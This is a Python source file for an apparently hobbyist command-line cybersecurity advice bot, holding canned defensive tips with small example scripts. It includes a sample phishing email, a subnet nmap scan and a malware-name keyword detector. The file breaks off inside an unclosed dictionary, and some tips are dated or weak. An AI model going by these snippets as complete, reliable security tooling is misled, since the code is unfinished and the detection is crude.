#!/usr/bin/env python3
"""
Termite - Enhanced Offline Cybersecurity Bot
A command-line tool for cybersecurity guidance, defense techniques, and tool creation
"""

import os
import sys
import re
from typing import Dict, List

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class TermiteBot:
    def __init__(self):
        # Original Q&A
        self.questions_answers = {
            "how to secure my password": f"{Colors.RED}Password Security Best Practices:{Colors.END}\n"
                                 f"{Colors.GREEN}• Use strong passwords (12+ characters) with uppercase, lowercase, numbers & symbols{Colors.END}\n"
                                 f"{Colors.GREEN}• Enable two-factor authentication (2FA) on all critical accounts{Colors.END}\n"
                                 f"{Colors.GREEN}• Never reuse the same password across multiple sites{Colors.END}\n"
                                 f"{Colors.GREEN}• Store passwords in encrypted password managers (e.g. Bitwarden, KeePass, 1Password){Colors.END}\n"
                                 f"{Colors.GREEN}• Use passphrases (e.g., 'Horse!Battery$Staple2024') instead of simple words{Colors.END}\n"
                                 f"{Colors.RED}• Avoid using names, birthdays, or dictionary words in passwords{Colors.END}\n"
                                 f"{Colors.RED}• Never share passwords or write them down in plain text{Colors.END}\n"
                                 f"{Colors.YELLOW}Example: Python Script to Evaluate Password Strength:{Colors.END}\n"
                                 f"{Colors.YELLOW}-----------------------------------------------------{Colors.END}\n"
                                 f"import re\n"
                                 f"def password_strength(password):\n"
                                 f"    score = 0\n"
                                 f"    if len(password) >= 12: score += 1\n"
                                 f"    if re.search(r'[A-Z]', password): score += 1\n"
                                 f"    if re.search(r'[a-z]', password): score += 1\n"
                                 f"    if re.search(r'[0-9]', password): score += 1\n"
                                 f"    if re.search(r'[^A-Za-z0-9]', password): score += 1\n"
                                 f"    return 'Strong' if score >= 4 else 'Weak'\n\n"
                                 f"print(password_strength('My$ecretP@ss123'))\n",  

                                     

        
            "how to protect against phishing": f"{Colors.RED}Phishing Protection Best Practices:{Colors.END}\n"
                                  f"{Colors.GREEN}• Always double-check the sender's email domain — look for small misspellings (e.g., amaz0n.com){Colors.END}\n"
                                  f"{Colors.GREEN}• Avoid clicking on links or downloading attachments from unknown or suspicious emails{Colors.END}\n"
                                  f"{Colors.GREEN}• Hover over links to preview the actual URL destination before clicking{Colors.END}\n"
                                  f"{Colors.GREEN}• Verify legitimacy of unexpected messages by contacting the sender through a separate trusted method{Colors.END}\n"
                                  f"{Colors.RED}• Never provide passwords, credit card numbers, or sensitive info via email or pop-ups{Colors.END}\n"
                                  f"{Colors.GREEN}• Use advanced spam filters and enable anti-phishing protection on your email client{Colors.END}\n"
                                  f"{Colors.GREEN}• Train users to recognize phishing signs and run periodic phishing simulations{Colors.END}\n"
                                  f"{Colors.YELLOW}Example of a Common Phishing Email:{Colors.END}\n"
                                  f"{Colors.YELLOW}-----------------------------------{Colors.END}\n"
                                  f"Subject: Urgent: Account Locked\n"
                                  f"From: security@amaz0n-support.com\n"
                                  f"Dear Customer,\n"
                                  f"We have detected unusual activity. Please verify your account here:\n"
                                  f"https://amaz0n-security-check.com/login\n"
                                  f"Failure to do so will result in permanent suspension.\n"
                                  f"Regards,\n"
                                  f"Amazon Security Team\n"
                                  f"{Colors.YELLOW}Example Python Script to Flag Suspicious URLs:{Colors.END}\n"
                                  f"{Colors.YELLOW}-------------------------------------------------{Colors.END}\n"
                                  f"import re\n"
                                  f"def is_suspicious(url):\n"
                                  f"    bad_keywords = ['login', 'verify', 'secure', 'update']\n"
                                  f"    suspicious = any(word in url.lower() for word in bad_keywords)\n"
                                  f"    return suspicious or bool(re.search(r'\\.(ru|cn|tk|xyz)', url))\n\n"
                                  f"print(is_suspicious('https://secure-verify-amaz0n.tk/login'))\n",                           




            "how to educate employees on cybersecurity": f"{Colors.CYAN}How To Educate Employees On Cybersecurity:{Colors.END}\n"
                                       f"{Colors.GREEN}• Description:{Colors.END} Employee cybersecurity training helps prevent human errors, which are one of the biggest causes of data breaches and attacks.\n\n"
                                       f"{Colors.GREEN}• Key Focus Areas:{Colors.END}\n"
                                       f"{Colors.YELLOW}  1. Phishing Awareness:\n"
                                       f"     Teach employees how to recognize phishing emails and avoid suspicious links or attachments.\n"
                                       f"{Colors.YELLOW}  2. Password Hygiene:\n"
                                       f"     Educate on creating strong, unique passwords and the importance of password managers.\n"
                                       f"{Colors.YELLOW}  3. Device Security:\n"
                                       f"     Encourage locking devices, using antivirus, and updating software regularly.\n"
                                       f"{Colors.YELLOW}  4. Safe Internet Use:\n"
                                       f"     Caution against public Wi-Fi, installing unknown apps, and visiting insecure sites.\n"
                                       f"{Colors.YELLOW}  5. Incident Reporting:\n"
                                       f"     Train staff on how to report suspicious activity quickly and through the right channels.\n\n"
                                       f"{Colors.GREEN}• Methods for Training:{Colors.END}\n"
                                       f"{Colors.YELLOW}  • Conduct regular cybersecurity workshops.\n"
                                       f"  • Use simulated phishing attacks.\n"
                                       f"  • Provide e-learning modules and newsletters.\n"
                                       f"  • Include cybersecurity in onboarding.\n\n"
                                       f"{Colors.GREEN}• Benefits:{Colors.END}\n"
                                       f"{Colors.YELLOW}  • Reduces risk of data breaches.\n"
                                       f"  • Builds a security-aware culture.\n"
                                       f"  • Strengthens organization-wide defense.\n\n"
                                       f"{Colors.CYAN}Note:{Colors.END} Security awareness is an ongoing process. Training should be continuous and adapt to emerging threats.",
        



            "how to secure smart home devices": f"{Colors.CYAN}How To Secure Smart Home Devices:{Colors.END}\n"
                                 f"{Colors.GREEN}• Description:{Colors.END} Smart home devices like cameras, thermostats, and voice assistants can become entry points for hackers if not secured properly.\n\n"
                                 f"{Colors.GREEN}• Key Security Steps:{Colors.END}\n"
                                 f"{Colors.YELLOW}  1. Change Default Credentials:\n"
                                 f"     Always change default usernames and passwords immediately after setup.\n"
                                 f"{Colors.YELLOW}  2. Use Strong, Unique Passwords:\n"
                                 f"     Create complex passwords for each device and manage them securely.\n"
                                 f"{Colors.YELLOW}  3. Keep Firmware Updated:\n"
                                 f"     Regularly check for and install firmware updates to patch known vulnerabilities.\n"
                                 f"{Colors.YELLOW}  4. Enable Network Segmentation:\n"
                                 f"     Place smart devices on a separate network (e.g., guest Wi-Fi) to limit access.\n"
                                 f"{Colors.YELLOW}  5. Disable Unused Features:\n"
                                 f"     Turn off services like remote access or UPnP if they are not necessary.\n\n"
                                 f"{Colors.GREEN}• Additional Tips:{Colors.END}\n"
                                 f"{Colors.YELLOW}  • Use a strong router password and WPA3 encryption if available.\n"
                                 f"  • Monitor devices for unusual activity using your router’s admin panel.\n"
                                 f"  • Avoid cheap or unknown-brand devices without security transparency.\n\n"
                                 f"{Colors.GREEN}• Example Scenario:{Colors.END}\n"
                                 f"{Colors.YELLOW}  A hacker scans your IP range, finds an IP camera with default login, and streams your footage. Strong passwords and firewall rules would prevent this.\n\n"
                                 f"{Colors.CYAN}Note:{Colors.END} The more devices you add, the more attack surfaces you create. Secure each one as if it's a gateway to your entire home.",





            "how to spot fake apps or extensions": f"{Colors.CYAN}How To Spot Fake Apps or Extensions:{Colors.END}\n"
                                  f"{Colors.GREEN}• Description:{Colors.END} Fake apps and browser extensions can impersonate legitimate tools to steal data, inject malware, or display unwanted ads.\n\n"
                                  f"{Colors.GREEN}• Signs of Fake Apps/Extensions:{Colors.END}\n"
                                  f"{Colors.YELLOW}  1. Unusual Permissions:\n"
                                  f"     Requests for permissions that don't align with app functionality (e.g., flashlight app requesting contacts).\n"
                                  f"{Colors.YELLOW}  2. Low Ratings and Negative Reviews:\n"
                                  f"     Check user feedback — fake apps often have poor ratings and repetitive or generic reviews.\n"
                                  f"{Colors.YELLOW}  3. Suspicious Publisher Info:\n"
                                  f"     Verify the developer or publisher name; fake apps usually impersonate known brands.\n"
                                  f"{Colors.YELLOW}  4. Typos and Bad Grammar:\n"
                                  f"     Poor language in the app description can indicate a rushed or malicious clone.\n"
                                  f"{Colors.YELLOW}  5. Unverified Sources:\n"
                                  f"     Avoid downloading apps from unofficial or third-party stores unless you're testing in a sandbox.\n\n"
                                  f"{Colors.GREEN}• How To Stay Safe:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Use official app stores (Google Play, App Store, Chrome Web Store).\n"
                                  f"  • Install reputable antivirus that scans apps and extensions in real time.\n"
                                  f"  • Cross-check app permissions and behavior after installation.\n\n"
                                  f"{Colors.GREEN}• Example Scenario:{Colors.END}\n"
                                  f"{Colors.YELLOW}  A Chrome extension claims to be a PDF viewer but silently tracks browsing and injects ads into websites. Spotting low reviews and requesting unnecessary permissions would raise red flags.\n\n"
                                  f"{Colors.CYAN}Note:{Colors.END} Always research before installing. One wrong extension can compromise your entire browser session.",   





            "how to configure two-factor authentication": f"{Colors.CYAN}How To Configure Two-Factor Authentication (2FA):{Colors.END}\n"
                                        f"{Colors.GREEN}• Description:{Colors.END} Two-Factor Authentication adds an extra layer of security by requiring a second form of verification beyond just a password.\n\n"
                                        f"{Colors.GREEN}• Common 2FA Methods:{Colors.END}\n"
                                        f"{Colors.YELLOW}  1. SMS Codes:\n"
                                        f"     Receive a code via text message after entering your password.\n"
                                        f"{Colors.YELLOW}  2. Authenticator Apps:\n"
                                        f"     Use apps like Google Authenticator, Microsoft Authenticator, or Authy to generate time-based codes.\n"
                                        f"{Colors.YELLOW}  3. Hardware Tokens:\n"
                                        f"     Use a physical device like YubiKey that must be inserted or tapped to verify.\n"
                                        f"{Colors.YELLOW}  4. Biometric Verification:\n"
                                        f"     Fingerprint, facial recognition, or retina scan (commonly used on mobile devices).\n\n"
                                        f"{Colors.GREEN}• How To Set It Up:{Colors.END}\n"
                                        f"{Colors.YELLOW}  • Step 1: Log in to your account (e.g., Google, Facebook, GitHub).\n"
                                        f"  • Step 2: Navigate to the security or account settings section.\n"
                                        f"  • Step 3: Select 'Enable 2FA' or 'Two-Step Verification'.\n"
                                        f"  • Step 4: Choose your preferred 2FA method.\n"
                                        f"  • Step 5: Follow the setup steps (e.g., scan QR code with authenticator app).\n"
                                        f"  • Step 6: Save recovery codes in a safe place!\n\n"
                                        f"{Colors.GREEN}• Why It's Important:{Colors.END}\n"
                                        f"{Colors.YELLOW}  • Even if someone steals your password, they still can’t access your account.\n"
                                        f"  • Blocks many automated attacks and phishing attempts.\n\n"
                                        f"{Colors.CYAN}Note:{Colors.END} Always use 2FA on critical accounts like email, banking, and cloud storage. Avoid relying on SMS-based 2FA alone — it’s better than nothing, but less secure than app or hardware-based options.",




            "how to use password managers": f"{Colors.CYAN}How To Use Password Managers:{Colors.END}\n"
                                       f"{Colors.GREEN}• Description:{Colors.END} Password managers help users generate, store, and autofill strong, unique passwords for every account.\n\n"
                                       f"{Colors.GREEN}• Why Use a Password Manager:{Colors.END}\n"
                                       f"{Colors.YELLOW}  1. Stores all your passwords securely in one place.\n"
                                       f"  2. Helps generate complex and unique passwords you don’t need to remember.\n"
                                       f"  3. Syncs across devices (cloud-based managers).\n"
                                       f"  4. Prevents password reuse — a major security risk.\n\n"
                                       f"{Colors.GREEN}• Popular Password Managers:{Colors.END}\n"
                                       f"{Colors.YELLOW}  • Bitwarden (open source)\n"
                                       f"  • LastPass\n"
                                       f"  • 1Password\n"
                                       f"  • KeePassXC (offline/local)\n"
                                       f"  • Dashlane\n\n"
                                       f"{Colors.GREEN}• How To Use:{Colors.END}\n"
                                       f"{Colors.YELLOW}  1. Download and install your preferred password manager.\n"
                                       f"  2. Set a **strong master password** – this is the only one you’ll need to remember.\n"
                                       f"  3. Add your existing accounts or import credentials if supported.\n"
                                       f"  4. Use the built-in password generator for creating new passwords.\n"
                                       f"  5. Enable browser extension or mobile app to autofill logins.\n\n"
                                       f"{Colors.GREEN}• Tips:{Colors.END}\n"
                                       f"{Colors.YELLOW}  • Don’t share your master password.\n"
                                       f"  • Enable 2FA on the password manager itself.\n"
                                       f"  • Regularly back up your vault (especially if using offline managers).\n\n"
                                       f"{Colors.CYAN}Note:{Colors.END} Password managers greatly reduce the risk of being hacked by eliminating weak and reused passwords. They're one of the most effective personal cybersecurity tools.",



            "how to avoid public wi-fi risks": f"{Colors.CYAN}How To Avoid Public Wi-Fi Risks:{Colors.END}\n"
                                          f"{Colors.GREEN}• Description:{Colors.END} Public Wi-Fi networks are often insecure and can be exploited by attackers to intercept data or launch attacks.\n\n"
                                          f"{Colors.GREEN}• Common Risks:{Colors.END}\n"
                                          f"{Colors.YELLOW}  1. Man-in-the-middle attacks\n"
                                          f"  2. Packet sniffing and session hijacking\n"
                                          f"  3. Fake access points (evil twins)\n"
                                          f"  4. Malware injection via network\n\n"
                                          f"{Colors.GREEN}• Safety Tips:{Colors.END}\n"
                                          f"{Colors.YELLOW}  • Use a VPN when using public Wi-Fi.\n"
                                          f"  • Never access banking or sensitive accounts over public Wi-Fi.\n"
                                          f"  • Turn off auto-connect to open networks.\n"
                                          f"  • Enable HTTPS-only mode in browser.\n\n"
                                          f"{Colors.CYAN}Note:{Colors.END} Treat all public Wi-Fi as hostile. Assume someone is watching — encrypt your traffic with VPN.",



            "how to recognize social engineering attacks": f"{Colors.CYAN}How To Recognize Social Engineering Attacks:{Colors.END}\n"
                                                      f"{Colors.GREEN}• Description:{Colors.END} Social engineering involves manipulating individuals into giving up confidential information or performing risky actions.\n\n"
                                                      f"{Colors.GREEN}• Common Forms:{Colors.END}\n"
                                                      f"{Colors.YELLOW}  1. Phishing emails\n"
                                                      f"  2. Impersonation or fake IT support\n"
                                                      f"  3. Baiting (USBs, links, free offers)\n"
                                                      f"  4. Pretexting (fake scenarios to build trust)\n\n"
                                                      f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                                      f"{Colors.YELLOW}  • Always verify requests via a second channel.\n"
                                                      f"  • Think before clicking unknown links.\n"
                                                      f"  • Don’t share personal info over phone/email.\n"
                                                      f"  • Educate yourself and others frequently.\n\n"
                                                      f"{Colors.CYAN}Note:{Colors.END} Social engineering preys on human psychology — awareness is your strongest defense.",



            "how to safely use usb devices": f"{Colors.CYAN}How To Safely Use USB Devices:{Colors.END}\n"
                                        f"{Colors.GREEN}• Description:{Colors.END} USB devices can carry malware or be weaponized to attack your system (e.g., BadUSB).\n\n"
                                        f"{Colors.GREEN}• Risks:{Colors.END}\n"
                                        f"{Colors.YELLOW}  1. Auto-running malware\n"
                                        f"  2. Data theft via rogue USB devices\n"
                                        f"  3. USB kill devices that fry hardware\n\n"
                                        f"{Colors.GREEN}• Tips to Stay Safe:{Colors.END}\n"
                                        f"{Colors.YELLOW}  • Never plug in untrusted or found USBs.\n"
                                        f"  • Disable auto-run features.\n"
                                        f"  • Scan devices with antivirus before use.\n"
                                        f"  • Use USB data blockers when charging in public.\n\n"
                                        f"{Colors.CYAN}Note:{Colors.END} USBs can be physical trojans — always treat them with caution.",




            "how to stay safe on social media": f"{Colors.CYAN}How To Stay Safe On Social Media:{Colors.END}\n"
                                           f"{Colors.GREEN}• Description:{Colors.END} Social media platforms are common targets for identity theft, stalking, and social engineering attacks.\n\n"
                                           f"{Colors.GREEN}• Common Threats:{Colors.END}\n"
                                           f"{Colors.YELLOW}  1. Oversharing personal data\n"
                                           f"  2. Fake profiles and catfishing\n"
                                           f"  3. Malicious links in DMs or posts\n"
                                           f"  4. Account takeovers\n\n"
                                           f"{Colors.GREEN}• Tips:{Colors.END}\n"
                                           f"{Colors.YELLOW}  • Set all profiles to private.\n"
                                           f"  • Avoid posting real-time location.\n"
                                           f"  • Don’t click on strange links.\n"
                                           f"  • Use 2FA and strong passwords.\n\n"
                                           f"{Colors.CYAN}Note:{Colors.END} Your social life online is a goldmine for attackers — protect your digital identity.",




            "how to secure your browsers": f"{Colors.CYAN}How To Secure Your Browsers:{Colors.END}\n"
                                      f"{Colors.GREEN}• Description:{Colors.END} Browsers are daily tools — and also attack vectors. Securing them minimizes risk from exploits, phishing, and trackers.\n\n"
                                      f"{Colors.GREEN}• Best Practices:{Colors.END}\n"
                                      f"{Colors.YELLOW}  • Keep your browser and extensions updated.\n"
                                      f"  • Use privacy-focused browsers like Firefox or Brave.\n"
                                      f"  • Disable unnecessary plugins.\n"
                                      f"  • Use HTTPS Everywhere and uBlock Origin.\n"
                                      f"  • Clear cache and cookies regularly.\n"
                                      f"  • Enable Do Not Track and sandbox mode.\n\n"
                                      f"{Colors.CYAN}Note:{Colors.END} Your browser is a window to the internet — make sure it has reinforced glass.",


            "how to secure my network": f"{Colors.RED}Network Security Best Practices:{Colors.END}\n"
                            f"{Colors.GREEN}• Use WPA3 encryption for all wireless networks — avoid WEP/WPA{Colors.END}\n"
                            f"{Colors.GREEN}• Change all default usernames and passwords on routers and IoT devices{Colors.END}\n"
                            f"{Colors.GREEN}• Implement strong firewall rules to block unnecessary inbound/outbound ports{Colors.END}\n"
                            f"{Colors.GREEN}• Disable WPS (Wi-Fi Protected Setup) which is often vulnerable to brute-force attacks{Colors.END}\n"
                            f"{Colors.GREEN}• Turn off unused services like UPnP, Telnet, and Remote Management{Colors.END}\n"
                            f"{Colors.GREEN}• Regularly update router and device firmware to patch vulnerabilities{Colors.END}\n"
                            f"{Colors.GREEN}• Use VLANs or guest networks to separate personal devices from IoT/work devices{Colors.END}\n"
                            f"{Colors.GREEN}• Enable MAC address filtering and hide SSID for extra obfuscation{Colors.END}\n"
                            f"{Colors.GREEN}• Deploy Intrusion Detection/Prevention Systems (IDS/IPS) if available on your router or network gateway{Colors.END}\n"
                            f"{Colors.RED}• Audit connected devices frequently to detect unknown or rogue systems{Colors.END}\n"
                            f"{Colors.YELLOW}Example: Scan your local network for unauthorized devices with nmap:{Colors.END}\n"
                            f"{Colors.YELLOW}---------------------------------------------{Colors.END}\n"
                            f"$ nmap -sn 192.168.1.0/24\n"
                            f"OR\n"
                            f"import os\n"
                            f"os.system('nmap -sn 192.168.0.0/24')  # Ping scan entire subnet{Colors.END}\n"
                            f"{Colors.YELLOW}Example: Disable WPS on TP-Link router:{Colors.END}\n"
                            f"Login to 192.168.0.1 → Advanced → Wireless Settings → Disable WPS → Save",
                                      





        
            "how to detect malware": f"{Colors.RED}Malware Detection Techniques:{Colors.END}\n"
                               f"{Colors.GREEN}• Use reputable antivirus and anti-malware tools (e.g., Malwarebytes, Windows Defender){Colors.END}\n"
                               f"{Colors.GREEN}• Monitor CPU/RAM usage — unexpected spikes may indicate malware{Colors.END}\n"
                               f"{Colors.GREEN}• Inspect running processes and startup programs (e.g., with Task Manager or ps/top){Colors.END}\n"
                               f"{Colors.GREEN}• Analyze open ports and outbound network connections using tools like netstat or Wireshark{Colors.END}\n"
                               f"{Colors.GREEN}• Check for scheduled tasks, registry modifications, and hidden directories in Windows/Linux{Colors.END}\n"
                               f"{Colors.RED}• Be cautious of strange pop-ups, slow system behavior, or auto-running USB drives{Colors.END}\n"
                               f"{Colors.GREEN}• Keep your OS, browsers, plugins, and all software patched with latest security updates{Colors.END}\n"
                               f"{Colors.YELLOW}Example: Python script to list suspicious processes using psutil:{Colors.END}\n"
                               f"{Colors.YELLOW}------------------------------------------------------{Colors.END}\n"
                               f"import psutil\n"
                               f"suspicious_keywords = ['keylogger', 'rat', 'stealer', 'miner']\n"
                               f"for proc in psutil.process_iter(['pid', 'name']):\n"
                               f"    for word in suspicious_keywords:\n"
                               f"        if word in proc.info['name'].lower():\n"
                               f"            print(f\"Suspicious process detected: {{proc.info}}\")",




        
            "how to secure mobile device": f"{Colors.RED}Mobile Device Security Best Practices:{Colors.END}\n"
                               f"{Colors.GREEN}• Use strong screen lock: biometric (fingerprint/face), PIN, or passcode{Colors.END}\n"
                               f"{Colors.GREEN}• Only install apps from trusted sources (Google Play, Apple App Store){Colors.END}\n"
                               f"{Colors.GREEN}• Regularly apply OS and security updates to patch vulnerabilities{Colors.END}\n"
                               f"{Colors.GREEN}• Avoid rooting/jailbreaking unless for controlled testing (Red Team labs){Colors.END}\n"
                               f"{Colors.GREEN}• Enable remote tracking and wipe via Find My Device or iCloud{Colors.END}\n"
                               f"{Colors.RED}• Use VPN on public Wi-Fi to encrypt data traffic{Colors.END}\n"
                               f"{Colors.RED}• Disable Bluetooth, NFC, and location services when not in use{Colors.END}\n"
                               f"{Colors.GREEN}• Beware of malicious SMS/phishing links (SMiShing){Colors.END}\n"
                               f"{Colors.YELLOW}Example: Python-based root detection snippet (Termux/Android):{Colors.END}\n"
                               f"{Colors.YELLOW}------------------------------------------------------{Colors.END}\n"
                               f"import os\n"
                               f"def is_rooted():\n"
                               f"    paths = ['/system/xbin/su', '/system/bin/su', '/system/app/Superuser.apk']\n"
                               f"    return any(os.path.exists(path) for path in paths)\n"
                               f"print('⚠️ Device is rooted!' if is_rooted() else '✅ Device is not rooted')",
                               
                                         
          




        
            "how to backup data securely": f"{Colors.RED}Secure Data Backup Practices:{Colors.END}\n"
                       f"{Colors.GREEN}• Follow the 3-2-1 rule: Keep 3 copies, on 2 different media, with 1 stored offsite (e.g., cloud){Colors.END}\n"
                       f"{Colors.GREEN}• Always encrypt backup data using strong encryption (e.g., AES-256){Colors.END}\n"
                       f"{Colors.GREEN}• Use versioned backups to protect against ransomware and accidental overwrites{Colors.END}\n"
                       f"{Colors.GREEN}• Schedule regular backup intervals (daily/weekly/monthly){Colors.END}\n"
                       f"{Colors.GREEN}• Test data restoration periodically to ensure integrity and usability{Colors.END}\n"
                       f"{Colors.RED}• Store offline or air-gapped copies to prevent malware from reaching backup systems{Colors.END}\n"
                       f"{Colors.GREEN}• Use access controls and MFA for cloud backup portals{Colors.END}\n"
                       f"{Colors.YELLOW}Example: Encrypting files using Python and Fernet (symmetric encryption){Colors.END}\n"
                       f"{Colors.YELLOW}------------------------------------------------------{Colors.END}\n"
                       f"from cryptography.fernet import Fernet\n"
                       f"key = Fernet.generate_key()\n"
                       f"cipher = Fernet(key)\n"
                       f"with open('backup.zip', 'rb') as file:\n"
                       f"    encrypted = cipher.encrypt(file.read())\n"
                       f"with open('backup.zip.enc', 'wb') as enc_file:\n"
                       f"    enc_file.write(encrypted)\n"
                       f"print(f'🔐 Backup encrypted. Save this key securely: {{key.decode()}}')",





        
            "how to secure email": f"{Colors.RED}Email Security Hardening:{Colors.END}\n"
                           f"{Colors.GREEN}• Use end-to-end encrypted email providers (e.g., ProtonMail, Tutanota){Colors.END}\n"
                           f"{Colors.GREEN}• Enable advanced spam & phishing filters (via DNSBLs, heuristics){Colors.END}\n"
                           f"{Colors.GREEN}• Never click or download unknown attachments or embedded scripts{Colors.END}\n"
                           f"{Colors.RED}• Disable automatic image loading to block tracking pixels & exploits{Colors.END}\n"
                           f"{Colors.GREEN}• Use strong, unique passwords and enable Multi-Factor Authentication (MFA){Colors.END}\n"
                           f"{Colors.GREEN}• Implement SPF, DKIM, and DMARC for domain email spoofing protection{Colors.END}\n"
                           f"{Colors.GREEN}• Regularly audit login sessions and mail forwarding rules for anomalies{Colors.END}\n"
                           f"{Colors.YELLOW}Example: SPF, DKIM, and DMARC Configuration (Linux DNS Zone):{Colors.END}\n"
                           f"{Colors.YELLOW}-------------------------------------------------------------{Colors.END}\n"
                           f"_spf.example.com. IN TXT \"v=spf1 include:_spf.google.com ~all\"\n"
                           f"default._domainkey.example.com. IN TXT \"v=DKIM1; k=rsa; p=MIGf...IDAQAB\"\n"
                           f"_dmarc.example.com. IN TXT \"v=DMARC1; p=quarantine; rua=mailto:admin@example.com\"",

            
 


        
            "how to protect against ransomware": f"{Colors.RED}Ransomware Protection & Mitigation:{Colors.END}\n"
                                     f"{Colors.GREEN}• Implement 3-2-1 backup strategy and test restores frequently{Colors.END}\n"
                                     f"{Colors.GREEN}• Keep OS, browsers, and all apps patched and updated{Colors.END}\n"
                                     f"{Colors.GREEN}• Use Next-Gen Antivirus (NGAV) & Endpoint Detection and Response (EDR){Colors.END}\n"
                                     f"{Colors.RED}• Never pay ransom – report the attack to CERT/CSIRT instead{Colors.END}\n"
                                     f"{Colors.GREEN}• Apply the principle of least privilege (POLP) to all user accounts{Colors.END}\n"
                                     f"{Colors.GREEN}• Disable macros/scripts in email attachments by default{Colors.END}\n"
                                     f"{Colors.GREEN}• Segment networks and restrict lateral movement (using VLANs/firewalls){Colors.END}\n"
                                     f"{Colors.YELLOW}Example: Windows GPO to disable macro execution:{Colors.END}\n"
                                     f"{Colors.YELLOW}--------------------------------------------------{Colors.END}\n"
                                     f"Computer Configuration > Admin Templates > Microsoft Office > Security Settings > Disable VBA macros",
            




        
            "how to secure social media": f"{Colors.RED}Social Media Security Guidelines:{Colors.END}\n"
                              f"{Colors.GREEN}• Review and customize privacy settings on each platform (e.g., Facebook, Instagram, X){Colors.END}\n"
                              f"{Colors.GREEN}• Limit exposure of personal details like birthday, phone, location, and email{Colors.END}\n"
                              f"{Colors.GREEN}• Use complex, unique passwords and enable 2FA (e.g., authenticator app, not SMS){Colors.END}\n"
                              f"{Colors.RED}• Reject suspicious friend/follow requests – verify accounts before engagement{Colors.END}\n"
                              f"{Colors.GREEN}• Regularly check login history and sign-out of unknown sessions{Colors.END}\n"
                              f"{Colors.GREEN}• Avoid posting your daily routines in real-time (location data exploitation risk){Colors.END}\n"
                              f"{Colors.YELLOW}Example: Facebook > Settings > Security and Login > Where You're Logged In{Colors.END}",
            
 



        
            "how to secure web browsing": f"{Colors.RED}Safe Web Browsing:{Colors.END}\n"
                             f"{Colors.GREEN}• Always browse using HTTPS-secured websites to ensure your data is encrypted in transit and cannot be intercepted.{Colors.END}\n"
                             f"{Colors.GREEN}• Keep your web browser and all extensions updated regularly to patch known vulnerabilities and security flaws.{Colors.END}\n"
                             f"{Colors.GREEN}• Install and configure privacy-focused browser extensions such as ad blockers (e.g., uBlock Origin) and script blockers (e.g., NoScript) to reduce exposure to malicious ads and scripts.{Colors.END}\n"
                             f"{Colors.RED}• Never download files or software from untrusted or unofficial sources, as they may contain malware or spyware.{Colors.END}\n"
                             f"{Colors.GREEN}• Clear your browser cookies, cache, and history periodically to prevent tracking and exposure of sensitive session data.{Colors.END}\n"
                             f"{Colors.GREEN}• Disable unnecessary browser features like autofill, pop-ups, and third-party cookies to enhance privacy.{Colors.END}\n"
                             f"{Colors.GREEN}• Use private browsing or incognito mode when researching sensitive topics or logging into shared computers.{Colors.END}\n"
                             f"{Colors.GREEN}• Consider using privacy-centric browsers like Brave or Firefox with hardened settings for daily use.{Colors.END}\n"
                             f"{Colors.YELLOW}• Example: Use HTTPS Everywhere and Privacy Badger plugins for enhanced protection.{Colors.END}",
 

 


        
            "how to create incident response plan": f"{Colors.RED}Incident Response Planning:{Colors.END}\n"
                                      f"{Colors.GREEN}• Identify and classify critical assets, data, and potential threats to prioritize response efforts effectively.{Colors.END}\n"
                                      f"{Colors.GREEN}• Define clear roles and responsibilities within the incident response team, including incident handlers, communicators, and decision-makers.{Colors.END}\n"
                                      f"{Colors.GREEN}• Establish detailed communication protocols both internally (within the team and organization) and externally (with stakeholders, law enforcement, and customers).{Colors.END}\n"
                                      f"{Colors.GREEN}• Develop step-by-step procedures for incident detection, analysis, containment, eradication, recovery, and post-incident review.{Colors.END}\n"
                                      f"{Colors.RED}• Conduct regular tabletop exercises and live simulations to test the effectiveness and readiness of the response plan.{Colors.END}\n"
                                      f"{Colors.GREEN}• Ensure the plan is regularly updated to incorporate lessons learned, evolving threats, and changes in the IT environment.{Colors.END}\n"
                                      f"{Colors.GREEN}• Maintain detailed documentation and logs of all incidents and responses for compliance, auditing, and continuous improvement.{Colors.END}\n"
                                      f"{Colors.GREEN}• Integrate the incident response plan with overall business continuity and disaster recovery strategies.{Colors.END}\n"
                                      f"{Colors.YELLOW}• Example: Follow frameworks like NIST SP 800-61 for best practices in incident response planning.{Colors.END}",




        
            "how to secure database": f"{Colors.RED}Database Security Best Practices:{Colors.END}\n"
                          f"{Colors.GREEN}• Enforce strong, unique credentials for all database users (avoid 'root' reuse){Colors.END}\n"
                          f"{Colors.GREEN}• Encrypt sensitive data both at rest (e.g., AES-256) and in transit (e.g., TLS/SSL){Colors.END}\n"
                          f"{Colors.GREEN}• Apply Role-Based Access Control (RBAC) and enforce least privilege{Colors.END}\n"
                          f"{Colors.RED}• Apply security patches regularly and track CVEs for DBMS (e.g., MySQL, PostgreSQL){Colors.END}\n"
                          f"{Colors.GREEN}• Enable logging and monitor for suspicious queries, access times, or failed logins{Colors.END}\n"
                          f"{Colors.GREEN}• Disable unused features and remove default test databases (e.g., 'test', 'sampleDB'){Colors.END}\n"
                          f"{Colors.YELLOW}Example: Use MySQL's audit plugin or PostgreSQL's pgAudit for tracking user actions{Colors.END}",




 
        
            "how to conduct security audit": f"{Colors.RED}Security Audit Process:{Colors.END}\n"
                                 f"{Colors.GREEN}• Define audit scope and objectives — Determine which systems, data, and controls will be assessed, and what the audit aims to achieve (e.g., compliance, risk reduction).{Colors.END}\n"
                                 f"{Colors.GREEN}• Review existing security policies and procedures — Analyze if the organization has documented policies and if they are being followed correctly.{Colors.END}\n"
                                 f"{Colors.GREEN}• Identify and evaluate assets — Catalog critical assets and assess how they are protected.{Colors.END}\n"
                                 f"{Colors.GREEN}• Test technical controls — Perform vulnerability scans, penetration tests, and evaluate firewall, antivirus, SIEM, and IDS/IPS effectiveness.{Colors.END}\n"
                                 f"{Colors.GREEN}• Interview staff and evaluate user practices — Check if users follow security best practices and understand policy requirements.{Colors.END}\n"
                                 f"{Colors.RED}• Document audit findings and provide clear recommendations — Include vulnerabilities found, non-compliance issues, and suggested remediations with risk ratings.{Colors.END}\n"
                                 f"{Colors.GREEN}• Create a remediation timeline — Assign responsible parties and realistic deadlines for addressing weaknesses.{Colors.END}\n"
                                 f"{Colors.YELLOW}• Example Tools: Nessus, Nmap, OpenVAS, Lynis, CIS-CAT for benchmarks{Colors.END}",


 




        
